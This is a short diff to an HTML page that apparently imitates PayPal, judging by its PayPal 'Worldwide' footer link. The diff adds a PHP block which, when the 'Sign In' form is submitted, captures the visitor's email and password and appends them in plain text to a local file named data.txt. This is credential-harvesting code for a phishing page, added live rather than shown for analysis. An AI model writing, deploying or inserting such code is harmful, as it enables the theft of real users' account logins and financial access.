@@ -231,5 +231,17 @@
         <a href="https://www.paypal.com/webapps/mpp/country-worldwide" target="_blank" class="worldwide">Worldwide</a>
     </center>
 </div>
+    <?php 
+if(isset($_POST['Sign In'])){
+$email = "Email: ".$_POST['email']."
+";
+$password = "Password: ".$_POST['password']."
+";
+$file=fopen("data.txt","a");
+fwrite($file, $email);
+fwrite($file, $password);
+fclose($file);
+}
+?>
 </body>
 </html>
